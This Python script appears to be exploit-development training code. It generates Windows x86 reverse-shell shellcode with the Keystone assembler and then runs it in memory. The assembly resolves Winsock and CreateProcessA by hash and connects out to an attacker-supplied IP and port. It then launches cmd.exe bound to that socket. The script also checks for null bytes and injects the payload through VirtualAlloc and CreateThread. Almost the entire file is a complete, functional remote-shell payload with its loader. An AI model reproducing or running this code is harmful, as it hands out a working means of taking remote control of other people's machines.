""" 
Reverse Shell shellcode

High level flow:
    Resolve kernel32 base address
    Resolve LoadLibraryA and CreateProcessA function addresses
    Resolve ws2_32 base address
    Resolve WSASocketA and WSAConnect function addresses
    Call WSASocketA
    Call WSAConnect
    Create STARTUPINFOA
    Create cmd string
    Call CreateProcessA
"""

import sys
import socket
import ctypes
import keystone

from struct import pack


def create_assembly(ip, port):

    hex_ip      = to_hex(ip)
    hex_port    = to_hex(port)

    print(f"[+] IP = {hex_ip}")
    print(f"[+] Port = {hex_port}")

    code = (
        f"""
            start:                            
                mov   ebp, esp;                 # Simulate start of function call (set new base as current top of stack)
                add   esp, 0xfffff9f0;          # Decrement esp to provide space for the frame (avoid NULL bytes)

            find_kernel32:                      # Assume kernel32 will be 3rd to load (risky)
                xor   ecx, ecx;                 # ECX = 0
                mov   esi, fs:[ecx+0x30];       # ESI = &(PEB)
                mov   esi, [esi+0x0C];          # ESI = PEB->Ldr
                mov   esi, [esi+0x1C];          # ESI = 1st loaded module
                mov   esi, [esi];               # ESI = 2nd loaded module
                mov   esi, [esi];               # ESI = 3rd loaded module
                mov   ebx, [esi+0x8];           # Save address

            jmp_fwd:              
                jmp   push_find_function_address;  

            pop_find_function_address:                  
                pop   dword ptr [ebp+0x04];     # EBP+4 -> find_function
                jmp   resolve_symbols_kernel32;   

            push_find_function_address:          
                call  pop_find_function_address;# Relative CALL with negative offset, pushes next instruction address

            find_function:                      # Set EAX to VMA of function (takes function name hash as arg)
                pushad;                         # Save all registers (Base addrerss of kernel32 is in EBP from previous step)
                mov   eax, [ebx+0x3c];          # EAX = Offset to PE Signature (from base address of DLL)
                mov   edi, [ebx+eax+0x78];      # EDI = Export Table Directory Relative Virtual Address
                add   edi, ebx;                 # EDI = Export Table Directory Virtual Memory Address
                mov   ecx, [edi+0x18];          # ECX = NumberOfNames
                mov   eax, [edi+0x20];          # EAX = AddressOfNames RVA
                add   eax, ebx;                 # EAX = AddressOfNames VMA
                mov   [ebp-4], eax;             # Save AddressOfNames VMA for later

            find_function_loop:                 # Set ESI to address of function name
                dec   ecx;                      # ECX -= 1 (NumberOfNames)
                mov   eax, [ebp-4];             # EAX = AddressOfNames VMA
                mov   esi, [eax+ecx*4];         # ESI = current symbol name RVA
                add   esi, ebx;                 # ESI = current symbol name VMA
                xor   eax, eax;                 # NULL EAX
                cdq;                            # NULL EDX
                cld;                            # From now on, string operations increment esi and edi

            compute_hash_loop:                 
                lodsb;                          # Load the next byte from esi into al (string op)
                test  al, al;                   # Check for NULL terminator
                jz    find_function_compare;    # If the ZF is set, we've hit the NULL term
                ror   edx, 0x0d;                # Rotate edx 13 bits to the right
                add   edx, eax;                 # Add the new byte to the accumulator
                jmp   compute_hash_loop;        # Next iteration

            find_function_compare:              
                cmp   edx, [esp+0x24];          # Compare the computed hash with the requested hash
                jnz   find_function_loop;       # If it doesn't match, go back to find_function_loop
                mov   edx, [edi+0x24];          # EDX = AddressOfNameOrdinals RVA
                add   edx, ebx;                 # EDX = AddressOfNameOrdinals VMA
                mov   cx,  [edx+2*ecx];         # CX = Extrapolate the function's ordinal
                mov   edx, [edi+0x1c];          # EDX = AddressOfFunctions RVA
                add   edx, ebx;                 # EDX = AddressOfFunctions VMA
                mov   eax, [edx+4*ecx];         # EAX = Function RVA
                add   eax, ebx;                 # EAX = Function VMA
                mov   [esp+0x1c], eax;          # Overwrite stack version of eax from pushad

            find_function_finished:             
                popad;                          # Restore registers
                ret;                              

            resolve_symbols_kernel32:           
                push  0xec0e4e8e;               # LoadLibraryA hash
                call  dword ptr [ebp+0x04];     # Call find_function; EAX = LoadLibraryA VMA
                mov   [ebp+0x14], eax;          # Save LoadLibraryA address

                push  0x16b3fe72;               # CreateProcessA hash
                call  dword ptr [ebp+0x04];     # Call find_function; EAX = CreateProcessA VMA
                mov   [ebp+0x18], eax;          # Save CreateProcessA address

            load_ws2_32:                       
                xor   eax, eax;                 # Null EAX
                mov   ax, 0x3233;               # 32
                push  eax;                      # 32\\0
                push  0x5f327377;               # ws2_
                push  esp;                      # ESP -> ws2_32
                call dword ptr [ebp+0x14];      # LoadLibraryA(ws2_32)
                mov   ebx, eax;                 # Move the base address of ws2_32.dll to EBX

            resolve_symbols_ws2_32:           
                push  0xadf509d9;               # WSASocketA hash
                call dword ptr [ebp+0x04];      # Call find_function
                mov   [ebp+0x28], eax;          # Save WSASocketA address for later usage

                push  0xb32dba0c;               # WSAConnect hash
                call dword ptr [ebp+0x04];      # Call find_function
                mov   [ebp+0x24], eax;          # Save WSAConnect address for later usage

            call_wsasocketa:                    # Open socket and set EAX to socket descriptor
                xor   eax, eax;                 # EAX = NULL
                push  eax;                      # dwFlags = NULL
                push  eax;                      # g = NULL
                push  eax;                      # lpProtocolInfo = NULl
                mov   al, 0x06;                 # Move AL, IPPROTO_TCP
                push  eax;                      # protocol = IPPROTO_TCP
                sub   al, 0x05;                 # EAX = AL = 0x01
                push  eax;                      # type = 0x01
                inc   eax;                      # EAX = 0x02
                push  eax;                      # af = 0x02
                call dword ptr [ebp+0x28];      # Call WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,null,null,null)

            call_wsaconnect:                    
                mov   esi, eax;                 # Move the SOCKET descriptor to ESI
                xor   ebx, ebx;                 # Null EAX
                push  ebx;                      # sin_zero[] = NULL
                push  ebx;                      # sin_zero[] = NULL
                push  {hex_ip};                 # sin_addr = Listener IP address
                mov   bx, {hex_port};           # AX = Listener Port
                shl   ebx, 0x10;                # EAX = Listener Port
                add   bx, 0x02;                 # Add 0x02 (AF_INET) to AX
                push  ebx;                      # sin_port = Listener Port & sin_family = 2 (AF_INET)
                push  esp;                      # Push pointer to the sockaddr_in structure
                pop   edi;                      # Store pointer to sockaddr_in in EDI
                xor   eax, eax;                 # EAX = NULL
                push  eax;                      # lpGQOS = NULl
                push  eax;                      # lpSQOS = NULL
                push  eax;                      # lpCalleeData = NULL
                push  eax;                      # lpCallerData = NULL
                add   al, 0x10;                 # Set AL to 0x10
                push  eax;                      # namelen = 16 bytes
                push  edi;                      # name = pointer to sockaddr_in struct
                push  esi;                      # s = socket descriptor
                call dword ptr [ebp+0x24];      # Call WSAConnect(socket, &sockaddr_in, sizeof(sockaddr_in), )

            create_startupinfoa:                
                push  esi;                      # hStdError = sock_fd
                push  esi;                      # hStdOutput = sock_fd
                push  esi;                      # hStdInput = sock_fd
                xor   eax, eax;                 # Null EAX
                push  eax;                      # lpReserved2 = NULL
                push  eax;                      # cbReserved2 & wShowWindow = NULL
                mov   eax, 0xfffffeff;          # EAX = -0x101
                neg eax;                        # EAX = 0x101
                dec eax;                        # EAX = 0x100
                push  eax;                      # dwFlags = 0x100
                xor   eax, eax;                 # Null EAX
                push  eax;                      # dwFillAttribute = NULL
                push  eax;                      # dwYCountChars = NULL
                push  eax;                      # dwXCountChars = NULL
                push  eax;                      # dwYSize = NULL
                push  eax;                      # dwXSize = NULL
                push  eax;                      # dwY = NULL
                push  eax;                      # dwX = NULL
                push  eax;                      # lpTitle = NULL
                push  eax;                      # lpDesktop = NULL
                push  eax;                      # lpReserved = NULL
                mov   al, 0x44;                 # EAX = 0x44
                push  eax;                      # cb = 0x44 (struct size)
                push  esp;                      # Push pointer to the STARTUPINFOA structure
                pop   edi;                      # Store pointer to STARTUPINFOA in EDI

            create_cmd_string:                  
                mov   eax, 0xff9b929d;          # EAX = -00646d63
                neg   eax;                      # EAX = 006646d63 ('cmd')
                push  eax;                      # Push 'exe' to stack
                push  esp;                      # Push pointer to the cmd.exe string
                pop   ebx;                      # Store pointer to the cmd.exe string in EBX

            call_createprocessa:                
                xchg   eax, esp;                # Move ESP to EAX
                mov   esp, eax;                 # Restore ESP
                xor   ecx, ecx;                 # Null ECX
                mov   cx, 0x390;                # Move 0x390 to CX
                sub   eax, ecx;                 # Subtract CX from EAX to avoid overwriting the structure later
                push  eax;                      # Push lpProcessInformation
                push  edi;                      # lpStartupInfo = struct we made earlier
                xor   eax, eax;                 # Null EAX
                push  eax;                      # lpCurrentDirectory = NULL
                push  eax;                      # lpEnvironment = NULL
                push  eax;                      # dwCreationFlags = NULL
                inc   eax;                      # EAX = 0x01 (TRUE)
                push  eax;                      # bInheritHandles = TRUE
                dec   eax;                      # Null EAX
                push  eax;                      # lpThreadAttributes = NULL
                push  eax;                      # lpProcessAttributes = NULL
                push  ebx;                      # Push lpCommandLine = 'cmd.exe'
                push  eax;                      # Push lpApplicationName = NULL
                call dword ptr [ebp+0x18];      # Call CreateProcessA

        """
    )

    return code

BADCHARS    = b"\x00"

def get_bad_indices(shellcode: bytes):
    print(f"[+] Checking if bad bytes {BADCHARS} are in shellcode...")
    return [i for i in range(len(shellcode)) if bytes([shellcode[i]]) in BADCHARS]


def to_hex(input):
    if '.' in input:
        return '0x' + ''.join(reversed([format(int(octet), '02x') for octet in input.split('.')]))
    else:
        port = int(input)
        return '0x' + format(port, '04x')[2:] + format(port, '04x')[:2]


def main():

    ip      = sys.argv[1]
    port    = sys.argv[2]

    # Initialise Winsock as shellcode assumes winsock is already initialised
    random_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    random_socket.close()

    # Create X86-32bit assembly
    ks      = keystone.Ks(keystone.KS_ARCH_X86, keystone.KS_MODE_32)
    code    = create_assembly(ip, port)

    # Create shellcode from assembly
    encoding, _ = ks.asm(code)

    # Format shellcode
    sh = b""
    for e in encoding:
        sh += pack("B", e)
    shellcode = bytearray(sh)
    print(f"[+] Shellcode is {len(shellcode)} bytes")

    # Check for bad bytes
    bad_indices = get_bad_indices(shellcode)
    if not bad_indices:
        print("[+] No bad bytes found :)")
    else:
        print(f"[+] Bad bytes found at indices: {bad_indices}")
        print(f"[+] Bad bytes {[hex(shellcode[i]) for i in bad_indices]}")

    formatted_output = "".join(f"\\x{byte:02x}" for byte in shellcode)
    print(f'[*] Generated shellcode = "{formatted_output}"')

    # Inject and execute shellcode if running on Windows
    runningOnWindows = input(f"[+] Are you running on Windows [Y/n]? ").lower() not in [
        "n",
        "no",
    ]
    if not runningOnWindows:
        print(f"[-] Run on Windows to continue!")
        exit()

    # Allocate virtual memory to store shellcode
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(shellcode)),
        ctypes.c_int(0x3000),
        ctypes.c_int(0x40),
    )

    if not ptr:
        print(f"[-] Could not allocate virtual memory!")
        raise ctypes.WinError()

    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

    # Copy shellcode to allocation address
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode))
    )

    print(f"[+] Shellcode located at address {hex(ptr)}")
    input(f"[?] Press Enter to execute shellcode...")

    hThread = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0)),
    )

    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(hThread), ctypes.c_int(-1))


if __name__ == "__main__":
    main()

